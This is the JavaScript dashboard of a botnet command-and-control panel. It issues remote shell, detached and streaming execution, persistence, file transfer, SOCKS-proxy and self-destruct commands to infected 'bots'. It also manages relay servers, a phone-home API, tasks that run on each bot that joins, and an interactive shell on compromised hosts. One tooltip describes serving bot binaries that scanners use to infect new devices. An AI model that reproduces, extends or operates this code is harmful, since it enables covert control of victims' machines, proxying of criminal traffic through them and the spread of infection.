    { id: 'arg-uf-host', label: 'Bins Host (optional)', placeholder: 'e.g. bins.example.com', tooltip: 'Host where architecture-specific bot binaries are served. Used by scanners to infect new devices. Leave empty to keep current value.' }
  ],
  '!lolnogtfo': []
};

function updateArgFields() {
  var typ = document.getElementById('cmd-type').value;
  var wrap = document.getElementById('arg-fields');
  var defs = cmdArgDefs[typ] || [];
  if (!defs.length) { wrap.innerHTML = ''; return; }
  var html = '';
  defs.forEach(function (d) {
    var vis = d.showWhen ? 'display:none' : '';
    var tip = d.tooltip ? ' title="' + d.tooltip + '"' : '';
    html += '<div class="cmd-group" id="grp-' + d.id + '" style="' + vis + '"><label' + tip + '>' + d.label + (d.tooltip ? ' <span style="cursor:help;opacity:0.4;font-size:11px" title="' + d.tooltip + '">&#9432;</span>' : '') + '</label>';
    if (d.type === 'select') {
      html += '<select id="' + d.id + '"' + tip + ' onchange="updateConditionalFields()">';
      d.options.forEach(function (o) { html += '<option value="' + o.v + '">' + o.t + '</option>'; });
      html += '</select>';
    } else {
      html += '<input type="' + (d.type === 'password' ? 'password' : 'text') + '" id="' + d.id + '" placeholder="' + (d.placeholder || '') + '"' + tip + '>';
    }
    html += '</div>';
  });
  wrap.innerHTML = html;
  updateConditionalFields();
  // Populate relay dropdown if socks command
  if (typ === '!socks') { populateRelayDropdown(); }
}

function updateConditionalFields() {
  var typ = document.getElementById('cmd-type').value;
  (cmdArgDefs[typ] || []).forEach(function (d) {
    if (!d.showWhen) return;
    var el = document.getElementById(d.showWhen.field);
    var grp = document.getElementById('grp-' + d.id);
    if (el && grp) { grp.style.display = (el.value === d.showWhen.val) ? '' : 'none'; }
  });
}

function buildArgs() {
  var typ = document.getElementById('cmd-type').value;
  switch (typ) {
    case '!shell': return (document.getElementById('arg-shell-cmd') || {}).value || '';
    case '!detach': return (document.getElementById('arg-detach-cmd') || {}).value || '';
    case '!socks':
      var mode = (document.getElementById('arg-socks-mode') || {}).value || 'direct';
      if (mode === 'relay') {
        return (document.getElementById('arg-socks-relay') || {}).value || '';
      }
      return (document.getElementById('arg-socks-port') || {}).value || '';
    case '!socksauth':
      var u = (document.getElementById('arg-sa-user') || {}).value || '';
      var p = (document.getElementById('arg-sa-pass') || {}).value || '';
      return (u && p) ? u + ' ' + p : '';
    case '!updatefetch':
      var ufUrl = (document.getElementById('arg-uf-url') || {}).value || '';
      var ufHost = (document.getElementById('arg-uf-host') || {}).value || '';
      return ufHost ? ufUrl + ' ' + ufHost : ufUrl;
    default: return '';
  }
}

function sendCmd() {
  var typ = document.getElementById('cmd-type').value;
  var args = buildArgs().trim();
  var botID = document.getElementById('cmd-bot').value.trim();
  if ((typ === '!shell' || typ === '!detach') && !args) { showToast('Please enter a command', false); return; }
  if (typ === '!updatefetch' && !args) { showToast('Please enter a fetch URL', false); return; }
  if (typ === '!socksauth') {
    var u = (document.getElementById('arg-sa-user') || {}).value || '';
    var p = (document.getElementById('arg-sa-pass') || {}).value || '';
    if (!u || !p) { showToast('Username and password required', false); return; }
  }

  if (typ === '!lolnogtfo' && !confirm('Kill all targeted bots? This cannot be undone.')) return;
  if (typ === '!updatefetch' && !confirm('Update fetch URL and rewrite persistence on all targeted bots?')) return;
  var command = typ;
  if (args) command += ' ' + args;
  var btn = document.querySelector('.cmd-send');
  if (btn) { btn.disabled = true; btn.textContent = 'Sending...'; }
  fetch('/api/command', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ command: command, botID: botID }) })
    .then(function (r) { return r.json(); }).then(function (d) {
      showToast(d.message, d.success);
      // If !socks command, also send !socksauth if creds provided
      if (typ === '!socks' && d.success) {
        var su = (document.getElementById('arg-socks-user') || {}).value || '';
        var sp = (document.getElementById('arg-socks-pass') || {}).value || '';
        if (su && sp) {
          fetch('/api/command', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ command: '!socksauth ' + su + ' ' + sp, botID: botID }) });
        }
      }
    })
    .catch(function () { showToast('Request failed', false); })
    .finally(function () { if (btn) { btn.disabled = false; btn.textContent = 'Send'; } });
}

function previewCmd() {
  var typ = document.getElementById('cmd-type').value;
  var args = buildArgs().trim();
  var command = typ;
  if (args) command += ' ' + args;
  if (!command.trim()) { showToast('Enter a command first', false); return; }

  showToast('Previewing on 5 bots...', true);
  fetch('/api/command/preview', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ command: command })
  }).then(function (r) { return r.json(); }).then(function (d) {
    if (!d.ok) { showToast('Preview failed: ' + (d.error || 'unknown'), false); return; }
    var responses = d.responses || [];
    var body = '<div style="font-size:12px;opacity:0.6;margin-bottom:8px">Command: <code>' + escHtml(command) + '</code> — sent to ' + d.sampled + ' bots</div>';
    if (responses.length === 0) {
      body += '<div style="opacity:0.5;padding:12px">No output received (10s timeout)</div>';
    } else {
      body += '<div style="max-height:300px;overflow-y:auto">';
      for (var i = 0; i < responses.length; i++) {
        var r = responses[i];
        body += '<div style="margin-bottom:8px;padding:8px;background:var(--bg-input,#0d1117);border-radius:6px;border:1px solid var(--border,#30363d)">' +
          '<div style="font-size:11px;opacity:0.5;margin-bottom:4px">' + escHtml(r.botID) + '</div>' +
          '<pre style="margin:0;font-size:12px;white-space:pre-wrap;word-break:break-all;color:var(--text-primary,#e6edf3)">' + escHtml(r.output) + '</pre></div>';
      }
      body += '</div>';
    }
    showConfirm({
      title: 'Command Preview',
      message: body,
      confirmText: 'Send to All',
      confirmColor: '#3fb950',
      onConfirm: function () { sendCmd(); }
    });
  }).catch(function (e) { showToast('Preview error: ' + e, false); });
}

// ---------------------------------------------------------------------------
// SOCKS Dashboard
// ---------------------------------------------------------------------------

function renderSocksDash() {
  if (!window._botsArr) return;
  var bots = window._botsArr;
  var active = bots.filter(function (b) { return b.socksActive; });
  var tabCount = document.getElementById('tab-socks-count');
  if (tabCount) tabCount.textContent = active.length;
  document.getElementById('socks-active').textContent = active.length;
  document.getElementById('socks-total').textContent = bots.length;
  var wrap = document.getElementById('socks-dash-wrap');
  if (!active.length) { wrap.innerHTML = '<div class="no-bots">No active SOCKS proxies</div>'; return; }
  var html = '<table class="socks-dash-table"><thead><tr><th>Bot ID</th><th>IP</th><th>Country</th><th>Port</th><th>Auth</th><th>Running Since</th><th></th></tr></thead><tbody>';
  active.forEach(function (b) {
    var id = b.botID.replace(/'/g, "\\'");
    html += '<tr><td style="color:var(--blue);font-family:monospace">' + escHtml(b.botID) + '</td>' +
      '<td style="font-family:monospace">' + escHtml(b.ip) + '</td>' +
      '<td><span class="country-badge" title="' + escHtml(b.country) + '">' + countryFlag(b.country) + '</span></td>' +
      '<td style="color:var(--accent);font-family:monospace">' + (b.socksRelay || '-') + '</td>' +
      '<td>' + (b.socksUser || '<span style="color:var(--text-dim)">none</span>') + '</td>' +
      '<td>' + (b.socksStarted ? ago(b.socksStarted) : '-') + '</td>' +
      '<td><button class="socks-stop-btn" onclick="popupCmd(\'' + id + '\',\'!stopsocks\')">Stop</button></td></tr>';
  });
  wrap.innerHTML = html + '</tbody></table>';
}



// ---------------------------------------------------------------------------
// Relay Management
// ---------------------------------------------------------------------------

var _relaysCache = [];

function populateRelayDropdown() {
  fetch('/api/relays').then(function (r) { return r.json(); }).then(function (relays) {
    _relaysCache = relays || [];
    var sel = document.getElementById('arg-socks-relay');
    if (!sel) return;
    sel.innerHTML = '';
    if (!relays.length) {
      sel.innerHTML = '<option value="">No relays configured</option>';
      return;
    }
    relays.forEach(function (r) {
      var opt = document.createElement('option');
      opt.value = r.host + ':' + r.controlPort;
      opt.textContent = r.name + ' (' + r.host + ':' + r.controlPort + ')';
      sel.appendChild(opt);
    });
  }).catch(function () { });
}

function loadRelays() {
  fetch('/api/relays').then(function (r) { return r.json(); }).then(function (relays) {
    _relaysCache = relays || [];
    renderRelayTable(relays);
  }).catch(function () { });
}

function renderRelayTable(relays) {
  var wrap = document.getElementById('relay-table-wrap');
  if (!wrap) return;
  if (!relays || !relays.length) {
    wrap.innerHTML = '<div class="no-bots">No relays configured. Add a relay server above.</div>';
    return;
  }
  var html = '<table class="socks-dash-table"><thead><tr><th>Name</th><th>Host</th><th>Control Port</th><th>SOCKS Port</th><th>Connect String</th><th></th></tr></thead><tbody>';
  relays.forEach(function (r) {
    html += '<tr><td style="color:var(--accent);font-family:monospace">' + escHtml(r.name) + '</td>' +
      '<td style="font-family:monospace">' + escHtml(r.host) + '</td>' +
      '<td>' + escHtml(r.controlPort) + '</td>' +
      '<td>' + escHtml(r.socksPort) + '</td>' +
      '<td style="font-family:monospace;color:var(--blue)">' + escHtml(r.host + ':' + r.controlPort) + '</td>' +
      '<td><button class="socks-stop-btn" onclick="deleteRelay(\'' + escHtml(r.id) + '\')">Delete</button></td></tr>';
  });
  wrap.innerHTML = html + '</tbody></table>';
  var tabCount = document.getElementById('tab-relays-count');
  if (tabCount) tabCount.textContent = relays.length;
}

function addRelay() {
  var name = (document.getElementById('relay-name') || {}).value || '';
  var host = (document.getElementById('relay-host') || {}).value || '';
  var cp = (document.getElementById('relay-cp') || {}).value || '9001';
  var sp = (document.getElementById('relay-sp') || {}).value || '1080';
  if (!host) { showToast('Relay host is required', false); return; }
  if (!cp) cp = '9001';
  if (!sp) sp = '1080';
  fetch('/api/relays', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ name: name, host: host, controlPort: cp, socksPort: sp })
  }).then(function (r) { return r.json(); }).then(function (d) {
    if (d.id) {
      showToast('Relay added: ' + (d.name || host), true);
      document.getElementById('relay-name').value = '';
      document.getElementById('relay-host').value = '';
      document.getElementById('relay-cp').value = '';
      document.getElementById('relay-sp').value = '';
      loadRelays();
    } else {
      showToast(d.error || 'Failed to add relay', false);
    }
  }).catch(function () { showToast('Request failed', false); });
}

function deleteRelay(id) {
  if (!confirm('Remove this relay?')) return;
  fetch('/api/relays?id=' + encodeURIComponent(id), { method: 'DELETE' })
    .then(function (r) { return r.json(); })
    .then(function (d) {
      showToast(d.success ? 'Relay removed' : (d.error || 'Failed'), d.success !== false);
      loadRelays();
    }).catch(function () { showToast('Request failed', false); });
}

// ---------------------------------------------------------------------------
// Relay Phone-Home API
// ---------------------------------------------------------------------------

var _relayAPIRunning = false;

function loadRelayAPIStatus() {
  fetch('/api/relay-api').then(function (r) { return r.json(); }).then(function (d) {
    _relayAPIRunning = d.running;
    var statusEl = document.getElementById('relay-api-status');
    var btn = document.getElementById('relay-api-toggle-btn');
    var portInput = document.getElementById('relay-api-port');
    if (statusEl) {
      if (d.running) {
        statusEl.innerHTML = '<span style="color:var(--green)">● Running on port ' + escHtml(d.port) + '</span>';
      } else {
        statusEl.innerHTML = '<span style="color:var(--text-dim)">○ Stopped</span>';
      }
    }
    if (btn) {
      btn.textContent = d.running ? 'Stop' : 'Start';
      btn.style.background = d.running ? 'var(--red, #e74c3c)' : '';
    }
    if (portInput) {
      if (d.running) {
        portInput.value = d.port;
        portInput.disabled = true;
      } else {
        portInput.disabled = false;
      }
    }
    loadRelayStats();
  }).catch(function () { });
}

function toggleRelayAPI() {
  if (_relayAPIRunning) {
    fetch('/api/relay-api', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ action: 'stop' })
    }).then(function (r) { return r.json(); }).then(function (d) {
      showToast(d.success ? 'Relay API stopped' : (d.error || 'Failed'), d.success);
      loadRelayAPIStatus();
    }).catch(function () { showToast('Request failed', false); });
  } else {
    var port = (document.getElementById('relay-api-port') || {}).value || '8443';
    fetch('/api/relay-api', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ action: 'start', port: port })
    }).then(function (r) { return r.json(); }).then(function (d) {
      showToast(d.success ? 'Relay API started on port ' + port : (d.error || 'Failed'), d.success);
      loadRelayAPIStatus();
    }).catch(function () { showToast('Request failed', false); });
  }
}

function loadRelayStats() {
  Promise.all([
    fetch('/api/relay-stats').then(function (r) { return r.json(); }).catch(function () { return {}; }),
    fetch('/api/relays').then(function (r) { return r.json(); }).catch(function () { return []; })
  ]).then(function (results) {
    var liveStats = results[0] || {};
    var configs = results[1] || [];
    renderRelayStats(liveStats, configs);
  });
}

function renderRelayStats(liveStats, configs) {
  var wrap = document.getElementById('relay-stats-wrap');
  var socksHealth = document.getElementById('socks-relay-health');

  // Build a merged list: all configured relays + any live-only entries
  var merged = {};
  // Start with configured relays
  (configs || []).forEach(function (c) {
    var key = c.name || (c.host + ':' + c.socksPort);
    merged[key] = {
      name: c.name || key,
      socks_port: c.socksPort || '1080',
      host: c.host,
      control_port: c.controlPort,
      connected_bots: 0, sessions_total: 0, sessions_active: 0,
      sessions_failed: 0, bytes_up: 0, bytes_down: 0, auth_failures: 0,
      last_seen: null, _configured: true, _live: false
    };
  });
  // Overlay live stats (match by name)
  var liveKeys = Object.keys(liveStats || {});
  liveKeys.forEach(function (name) {
    var s = liveStats[name];
    if (merged[name]) {
      // Merge live data onto configured entry
      for (var k in s) { merged[name][k] = s[k]; }
      merged[name]._live = true;
    } else {
      // Live-only relay (not in config)
      s._configured = false;
      s._live = true;
      merged[s.name || name] = s;
    }
  });

  var keys = Object.keys(merged);

  // --- Relays tab: full stats table ---
  if (wrap) {
    if (!keys.length) {
      wrap.innerHTML = '';
    } else {
      var html = '<h4 style="color:var(--text-dim);margin:0 0 8px;font-size:13px">Live Relay Stats</h4>';
      html += '<table class="socks-dash-table"><thead><tr><th>Relay</th><th>Bots</th><th>Sessions</th><th>Active</th><th>Failed</th><th>\u2191 Bytes</th><th>\u2193 Bytes</th><th>Auth Fail</th><th>Last Seen</th></tr></thead><tbody>';
      keys.forEach(function (name) {
        var s = merged[name];
        var agoText = s._live ? relayAgo(s) : '<span style="color:var(--text-dim)">no data</span>';
        html += '<tr>' +
          '<td style="color:var(--accent);font-family:monospace">' + escHtml(s.name || name) + '</td>' +
          '<td>' + (s.connected_bots || 0) + '</td>' +
          '<td>' + (s.sessions_total || 0) + '</td>' +
          '<td>' + (s.sessions_active || 0) + '</td>' +
          '<td>' + (s.sessions_failed || 0) + '</td>' +
          '<td style="font-family:monospace">' + humanBytes(s.bytes_up || 0) + '</td>' +
          '<td style="font-family:monospace">' + humanBytes(s.bytes_down || 0) + '</td>' +
          '<td>' + (s.auth_failures || 0) + '</td>' +
          '<td>' + agoText + '</td>' +
          '</tr>';
      });
      html += '</tbody></table>';
      wrap.innerHTML = html;
    }
  }

  // --- SOCKS tab: relay health cards ---
  if (socksHealth) {
    if (!keys.length) {
      socksHealth.innerHTML = '<div style="color:var(--text-dim);font-size:13px;padding:8px 0">No relays configured. Add relays in the Relays tab.</div>';
    } else {
      var cards = '<h4 style="color:var(--text-dim);margin:0 0 10px;font-size:13px">Relay Health</h4><div class="relay-health-grid">';
      keys.forEach(function (name) {
        var s = merged[name];
        var agoText = relayAgo(s);
        var diffSec = s.last_seen ? Math.floor((Date.now() - new Date(s.last_seen).getTime()) / 1000) : 9999;
        var healthDot, healthLabel, healthCss;
        if (!s._live) {
          healthDot = 'health-dot-dead';
          healthLabel = 'No Data';
          healthCss = 'health-nodata';
        } else if (diffSec < 60) {
          healthDot = 'health-dot-ok';
          healthLabel = 'Healthy';
          healthCss = 'health-green';
        } else if (diffSec < 300) {
          healthDot = 'health-dot-warn';
          healthLabel = 'Stale';
          healthCss = 'health-yellow';
        } else {
          healthDot = 'health-dot-stale';
          healthLabel = 'Offline';
          healthCss = 'health-red';
        }
        var totalBW = (s.bytes_up || 0) + (s.bytes_down || 0);
        cards += '<div class="relay-health-card">' +
          '<div class="rhc-header"><span class="health-dot ' + healthDot + '"></span>' +
          '<span class="rhc-name">' + escHtml(s.name || name) + '</span>' +
          '<span class="rhc-status rhc-status-' + healthCss + '">' + healthLabel + '</span></div>' +
          '<div class="rhc-stats">' +
          '<div class="rhc-stat"><span class="rhc-label">Bots</span><span class="rhc-val">' + (s.connected_bots || 0) + '</span></div>' +
          '<div class="rhc-stat"><span class="rhc-label">Active</span><span class="rhc-val" style="color:var(--green)">' + (s.sessions_active || 0) + '</span></div>' +
          '<div class="rhc-stat"><span class="rhc-label">Total</span><span class="rhc-val">' + (s.sessions_total || 0) + '</span></div>' +
          '<div class="rhc-stat"><span class="rhc-label">Failed</span><span class="rhc-val" style="color:var(--red,#e74c3c)">' + (s.sessions_failed || 0) + '</span></div>' +
          '<div class="rhc-stat"><span class="rhc-label">\u2191 Up</span><span class="rhc-val">' + humanBytes(s.bytes_up || 0) + '</span></div>' +
          '<div class="rhc-stat"><span class="rhc-label">\u2193 Down</span><span class="rhc-val">' + humanBytes(s.bytes_down || 0) + '</span></div>' +
          '<div class="rhc-stat"><span class="rhc-label">Bandwidth</span><span class="rhc-val" style="color:var(--accent)">' + humanBytes(totalBW) + '</span></div>' +
          '<div class="rhc-stat"><span class="rhc-label">Auth Fail</span><span class="rhc-val">' + (s.auth_failures || 0) + '</span></div>' +
          '</div>' +
          '<div class="rhc-footer">' + (s.host ? escHtml(s.host) + ' \u00b7 ' : '') + 'SOCKS :' + escHtml(s.socks_port || '?') + (agoText ? ' \u00b7 ' + escHtml(agoText) : '') + '</div>' +
          '</div>';
      });
      cards += '</div>';
      socksHealth.innerHTML = cards;
    }
  }
}

function relayAgo(s) {
  if (!s.last_seen) return '';
  var diff = Math.floor((Date.now() - new Date(s.last_seen).getTime()) / 1000);
  if (diff < 60) return diff + 's ago';
  if (diff < 3600) return Math.floor(diff / 60) + 'm ago';
  return Math.floor(diff / 3600) + 'h ago';
}

function humanBytes(b) {
  if (b < 1024) return b + ' B';
  if (b < 1048576) return (b / 1024).toFixed(1) + ' KB';
  if (b < 1073741824) return (b / 1048576).toFixed(1) + ' MB';
  return (b / 1073741824).toFixed(2) + ' GB';
}

// ---------------------------------------------------------------------------
// Activity Feed
// ---------------------------------------------------------------------------

var lastActivityLen = 0;
var activityTypeFilter = 'all';

function addActivityEntry(entry) {
  var al = document.getElementById('activity-list');
  var placeholder = al.querySelector('.no-bots'); if (placeholder) placeholder.remove();
  var div = document.createElement('div'); div.className = 'activity-entry';
  div.setAttribute('data-type', entry.type);
  div.innerHTML = '<span class="activity-time">' + escHtml(entry.time) + '</span>' +
    '<span class="activity-type ' + escHtml(entry.type) + '">' + escHtml(entry.type) + '</span>' +
    '<span class="activity-msg">' + escHtml(entry.message) + '</span>';
  al.appendChild(div);
  var entries = al.querySelectorAll('.activity-entry');
  if (entries.length > 500) entries[0].remove();
  filterActivity();
  addNotification(entry.time, entry.type + ': ' + entry.message);
}

function renderActivityFull(entries) {
  if (!entries || !entries.length) return;
  var al = document.getElementById('activity-list');
  al.innerHTML = entries.map(function (e) {
    return '<div class="activity-entry" data-type="' + escHtml(e.type) + '"><span class="activity-time">' + escHtml(e.time) + '</span>' +
      '<span class="activity-type ' + escHtml(e.type) + '">' + escHtml(e.type) + '</span>' +
      '<span class="activity-msg">' + escHtml(e.message) + '</span></div>';
  }).join('');
  if (entries.length > lastActivityLen) {
    entries.slice(lastActivityLen).forEach(function (e) { addNotification(e.time, e.type + ': ' + e.message); });
  }
  lastActivityLen = entries.length;
  filterActivity();
}

function toggleActivityFilter(el) {
  document.querySelectorAll('.activity-filter-chip').forEach(function (c) { c.classList.remove('active'); });
  el.classList.add('active');
  activityTypeFilter = el.getAttribute('data-type');
  filterActivity();
}

function filterActivity() {
  var q = (document.getElementById('activity-search') || {}).value || '';
  q = q.toLowerCase();
  var entries = document.querySelectorAll('#activity-list .activity-entry');
  var shown = 0;
  entries.forEach(function (e) {
    var type = (e.getAttribute('data-type') || '').toLowerCase();
    var typeMatch = activityTypeFilter === 'all' || type === activityTypeFilter;
    var textMatch = !q || e.textContent.toLowerCase().indexOf(q) !== -1;
    if (typeMatch && textMatch) { e.style.display = ''; shown++; }
    else { e.style.display = 'none'; }
  });
  var countEl = document.getElementById('activity-count');
  if (countEl) {
    if (q || activityTypeFilter !== 'all') { countEl.textContent = shown + '/' + entries.length; }
    else { countEl.textContent = entries.length ? entries.length + ' events' : ''; }
  }
}

function clearActivity() {
  document.getElementById('activity-list').innerHTML = '<div class="no-bots">No activity yet</div>';
  var countEl = document.getElementById('activity-count');
  if (countEl) countEl.textContent = '';
}

// ---------------------------------------------------------------------------
// Task Management
// ---------------------------------------------------------------------------

function updateTaskArgFields() {
  var typ = document.getElementById('task-type').value;
  var wrap = document.getElementById('task-arg-fields');
  var defs = cmdArgDefs[typ] || [];
  if (!defs.length) { wrap.innerHTML = ''; return; }
  var html = '';
  defs.forEach(function (d) {
    var vis = d.showWhen ? 'display:none' : '';
    html += '<div class="cmd-group" id="tgrp-' + d.id + '" style="' + vis + '"><label>' + d.label + '</label>';
    if (d.type === 'select') {
      html += '<select id="t-' + d.id + '" onchange="updateTaskConditionalFields()">';
      d.options.forEach(function (o) { html += '<option value="' + o.v + '">' + o.t + '</option>'; });
      html += '</select>';
    } else {
      html += '<input type="' + (d.type === 'password' ? 'password' : 'text') + '" id="t-' + d.id + '" placeholder="' + (d.placeholder || '') + '">';
    }
    html += '</div>';
  });
  wrap.innerHTML = html;
  updateTaskConditionalFields();
  if (typ === '!socks') { populateTaskRelayDropdown(); }
}

function updateTaskConditionalFields() {
  var typ = document.getElementById('task-type').value;
  (cmdArgDefs[typ] || []).forEach(function (d) {
    if (!d.showWhen) return;
    var el = document.getElementById('t-' + d.showWhen.field);
    var grp = document.getElementById('tgrp-' + d.id);
    if (el && grp) { grp.style.display = (el.value === d.showWhen.val) ? '' : 'none'; }
  });
}

function populateTaskRelayDropdown() {
  fetch('/api/relays').then(function (r) { return r.json(); }).then(function (relays) {
    var sel = document.getElementById('t-arg-socks-relay');
    if (!sel) return;
    sel.innerHTML = '';
    if (!relays || !relays.length) {
      sel.innerHTML = '<option value="">No relays configured</option>';
      return;
    }
    relays.forEach(function (r) {
      var opt = document.createElement('option');
      opt.value = r.host + ':' + r.controlPort;
      opt.textContent = r.name + ' (' + r.host + ':' + r.controlPort + ')';
      sel.appendChild(opt);
    });
  }).catch(function () { });
}

function buildTaskCommand() {
  var typ = document.getElementById('task-type').value;
  var args = '';
  switch (typ) {
    case '!shell': args = (document.getElementById('t-arg-shell-cmd') || {}).value || ''; break;
    case '!detach': args = (document.getElementById('t-arg-detach-cmd') || {}).value || ''; break;
    case '!socks':
      var mode = (document.getElementById('t-arg-socks-mode') || {}).value || 'direct';
      if (mode === 'relay') { args = (document.getElementById('t-arg-socks-relay') || {}).value || ''; }
      else { args = (document.getElementById('t-arg-socks-port') || {}).value || ''; }
      break;
    case '!socksauth':
      var u = (document.getElementById('t-arg-sa-user') || {}).value || '';
      var p = (document.getElementById('t-arg-sa-pass') || {}).value || '';
      if (u && p) args = u + ' ' + p;
      break;
    default: break;
  }
  var cmd = typ;
  if (args.trim()) cmd += ' ' + args.trim();
  return cmd;
}

function loadTasks() {
  fetch('/api/tasks').then(function (r) { return r.json(); }).then(function (tasks) {
    renderTaskTable(tasks);
  }).catch(function () { });
}

function renderTaskTable(tasks) {
  var wrap = document.getElementById('task-table-wrap');
  if (!wrap) return;
  var active = tasks.filter(function (t) { return !t.expired; });
  var tabCount = document.getElementById('tab-tasks-count');
  if (tabCount) tabCount.textContent = active.length;
  var activeCount = document.getElementById('task-active-count');
  if (activeCount) activeCount.textContent = active.length;
  if (!tasks || !tasks.length) {
    wrap.innerHTML = '<div class="task-empty">No active tasks. Create one above.</div>';
    return;
  }
  var html = '';
  tasks.forEach(function (t) {
    var isExpired = t.expired;
    var dotClass = isExpired ? 'expired' : 'active';
    var badgeClass = t.runOnce ? 'once' : 'every';
    var badgeText = t.runOnce ? 'Run Once' : 'Every Join';
    var created = new Date(t.createdAt);
    var createdStr = ('0' + created.getHours()).slice(-2) + ':' + ('0' + created.getMinutes()).slice(-2);
    var expiresStr = 'never';
    if (t.expiresAt && !isExpired) {
      var exp = new Date(t.expiresAt);
      var remaining = Math.max(0, Math.floor((exp - Date.now()) / 1000));
      if (remaining > 3600) expiresStr = Math.floor(remaining / 3600) + 'h ' + Math.floor((remaining % 3600) / 60) + 'm';
      else if (remaining > 60) expiresStr = Math.floor(remaining / 60) + 'm ' + (remaining % 60) + 's';
      else expiresStr = remaining + 's';
    } else if (isExpired) {
      expiresStr = 'expired';
    }
    html += '<div class="task-card' + (isExpired ? ' expired' : '') + '">' +
      '<div class="task-status-dot ' + dotClass + '"></div>' +
      '<div class="task-cmd" title="' + escHtml(t.command) + '">' + escHtml(t.command) + '</div>' +
      '<div class="task-meta">' +
      '<span class="task-badge ' + badgeClass + '">' + badgeText + '</span>' +
      '<span class="task-meta-item"><span class="task-meta-label">created</span> ' + createdStr + '</span>' +
      '<span class="task-meta-item"><span class="task-meta-label">TTL</span> ' + expiresStr + '</span>' +
      '<span class="task-meta-item"><span class="task-meta-label">ran on</span> ' + t.executed + ' bots</span>' +
      '</div>' +
      '<button class="task-remove" onclick="deleteTask(\'' + escHtml(t.id) + '\')">Stop</button>' +
      '</div>';
  });
  wrap.innerHTML = html;
}

function addTask() {
  var command = buildTaskCommand();
  var typ = document.getElementById('task-type').value;
  if ((typ === '!shell' || typ === '!detach') && command === typ) { showToast('Please enter a command', false); return; }
  if (typ === '!socksauth') {
    var u = (document.getElementById('t-arg-sa-user') || {}).value || '';
    var p = (document.getElementById('t-arg-sa-pass') || {}).value || '';
    if (!u || !p) { showToast('Username and password required', false); return; }
  }
  var duration = parseInt((document.getElementById('task-duration') || {}).value) || 0;
  var runOnce = (document.getElementById('task-runonce') || {}).checked || false;
  fetch('/api/tasks', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ command: command, duration: duration, runOnce: runOnce })
  }).then(function (r) { return r.json(); }).then(function (d) {
    if (d.success) {
      showToast('Task created: ' + command, true);
      document.getElementById('task-duration').value = '0';
      document.getElementById('task-runonce').checked = false;
      updateTaskArgFields();
      loadTasks();
    } else {
      showToast(d.error || 'Failed to create task', false);
    }
  }).catch(function () { showToast('Request failed', false); });
}

function deleteTask(id) {
  if (!confirm('Remove this task?')) return;
  fetch('/api/tasks?id=' + encodeURIComponent(id), { method: 'DELETE' })
    .then(function (r) { return r.json(); })
    .then(function (d) {
      showToast(d.success ? 'Task removed' : (d.error || 'Failed'), d.success !== false);
      loadTasks();
    }).catch(function () { showToast('Request failed', false); });
}

// ---------------------------------------------------------------------------
// Notification Drawer
// ---------------------------------------------------------------------------

var notifHistory = [], notifUnseen = 0;

function addNotification(time, msg) {
  notifHistory.push({ time: time, msg: msg });
  if (notifHistory.length > 50) notifHistory = notifHistory.slice(-50);
  notifUnseen++; updateNotifBadge(); renderNotifList();
  lsSet('notifs', notifHistory);
}

function updateNotifBadge() {
  var b = document.getElementById('notif-badge');
  if (notifUnseen > 0) { b.style.display = 'flex'; b.textContent = notifUnseen > 99 ? '99+' : notifUnseen; }
  else { b.style.display = 'none'; }
}

// ---------------------------------------------------------------------------
// Tab switching
// ---------------------------------------------------------------------------

function switchTab(btn) {
  document.querySelectorAll('.tab').forEach(function (t) { t.classList.remove('active'); });
  document.querySelectorAll('.tab-panel').forEach(function (p) { p.classList.remove('active'); });
  btn.classList.add('active');
  var panel = document.getElementById(btn.getAttribute('data-tab'));
  if (panel) panel.classList.add('active');
  lsSet('tab', btn.getAttribute('data-tab'));
}

function toggleNotifs() {
  var d = document.getElementById('notif-drawer');
  if (d.classList.contains('open')) { d.classList.remove('open'); }
  else { d.classList.add('open'); notifUnseen = 0; updateNotifBadge(); }
}

function renderNotifList() {
  var nl = document.getElementById('notif-list');
  if (!notifHistory.length) { nl.innerHTML = '<div class="notif-empty">No notifications yet</div>'; return; }
  nl.innerHTML = notifHistory.map(function (n) {
    return '<div class="notif-entry"><div class="notif-time">' + escHtml(n.time) + '</div><div class="notif-msg">' + escHtml(n.msg) + '</div></div>';
  }).reverse().join('');
}

// ---------------------------------------------------------------------------
// Shell Modal — Enhanced with file browser, breadcrumb, tab completion,
// bot info sidebar, multi-tab, copy output, net scan, socks button
// ---------------------------------------------------------------------------

var shellWS = null, shellHistory = [], shellHistIdx = -1, shellBotID = '', shellCwd = '~';
var shellSessions = {};  // {botID: {output, cmds, cwd, cmdLog}}
var shellBgSessions = {};  // {botID: WebSocket} — live WS kept after shell close
var _shellAutoSent = 0;   // auto commands (ls, cd) not shown in terminal but sent to bot
var shellTabs = []; // [{botID, ws, output, cmds, cwd}]
var activeShellTab = 0;
var pendingFileRefresh = false;
var pendingCdRefresh = false;
var shellCmdLog = [];          // [{ts, cmd}] — persistent history log
var _ctxEntry = null;        // current file context menu target {name, isDir, cwd}
var shellStreamActive = 0;   // counter: number of in-flight streaming commands

// Tab completion definitions
var tcCommands = [
  { cmd: '!shell', desc: 'Execute shell command' },
  { cmd: '!detach', desc: 'Background exec (no output)' },
  { cmd: '!stream', desc: 'Streaming exec (real-time)' },
  { cmd: '!socks', desc: 'Start SOCKS proxy' },
  { cmd: '!stopsocks', desc: 'Stop SOCKS proxy' },
  { cmd: '!socksauth', desc: 'Set SOCKS credentials' },
  { cmd: '!info', desc: 'System information' },
  { cmd: '!persist', desc: 'Install persistence' },
  { cmd: '!download', desc: 'Download file from bot' },
  { cmd: '!upload', desc: 'Upload file to bot' },
  { cmd: '!kill', desc: 'Self-destruct' }
];
var tcIdx = -1, tcMatches = [];

function openShell(botID) {
  closeShell();
  shellTabs = [{ botID: botID }];
  activeShellTab = 0;
  activateShellTab(0);
}

function addShellTab(botID) {
  // Check if tab already exists
  for (var i = 0; i < shellTabs.length; i++) {
    if (shellTabs[i].botID === botID) { switchShellTab(i); return; }
  }
  shellTabs.push({ botID: botID });
  switchShellTab(shellTabs.length - 1);
}

function activateShellTab(idx) {
  var tab = shellTabs[idx];
  if (!tab) return;
  shellBotID = tab.botID;
  activeShellTab = idx;

